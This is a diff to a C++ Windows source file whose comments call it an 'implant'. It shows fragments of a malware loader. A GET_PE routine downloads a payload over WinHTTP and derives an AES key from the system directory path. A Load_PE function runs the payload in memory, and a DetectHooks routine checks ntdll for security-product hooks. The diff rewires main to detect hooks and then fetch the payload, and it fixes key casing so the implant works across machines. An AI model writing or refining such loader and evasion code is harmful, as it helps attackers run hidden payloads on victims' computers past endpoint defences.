@@ -4,6 +4,7 @@
 #include <winhttp.h>		// For http Operation
 #include <vector>
 #include <wincrypt.h>
+#include <ctype.h>          // For toUpper usage
 
 #pragma comment (lib, "crypt32.lib")    //  For AES Encryption
 #pragma comment(lib, "winhttp")
@@ -66,8 +67,8 @@ void Load_PE(char* pe, DWORD pe_size)
 #define MAX 100
 
 // From link: https://stackoverflow.com/questions/38672719/post-request-in-winhttp-c
-//int GET_PE()
-int main()
+int GET_PE()
+//int main()
 {
 	//structure data;
     std::vector<unsigned char> buffer;
@@ -317,6 +318,12 @@ int main()
 
     printf("[+] Retrieved Key length: %d\n", (int)size_key); //getchar();
 
+
+    // I saw that:
+    // 1. In My windows Host: my cpp implant is retrieving: "C:\WINDOWS\system32" via GetSystemDirectoryA()
+    // 2. But in my Windows VM: my cpp implant is retrieving: "C:\Windows\system32" via GetSystemDirectoryA()
+    // 3. Changing the Whole string to UpperCase(), after retrieving to avoid confusion.
+
     char KEY_16[16];
 
     int i = 0, count = 1;
@@ -325,7 +332,7 @@ int main()
         if(count <= 16)
         {    
             //printf("The Character at %d Index Position = %c \n", i, KEY[i]); getchar();
-            KEY_16[i] = KEY[i];
+            KEY_16[i] = toupper(KEY[i]);
             //printf("The Character at %d Index Position = %c \n", i, KEY_16[i]);
             i++;
             count++;
@@ -616,8 +623,8 @@ int main()
 }
 
 
-//int main()
-int DetectHooks()
+int main()
+//int DetectHooks()
 {
 	HMODULE BaseAddr = GetModuleHandle((LPCSTR) sNtdll);
 	//HMODULE BaseAddr = LoadLibrary((LPCSTR) sNtdll);
@@ -692,7 +699,7 @@ int DetectHooks()
 
 	printf("Press Enter to Exit Prompt... "); getchar();
 
-	//int e = GET_PE();
+	int e = GET_PE();
 
 	return 0;
 }
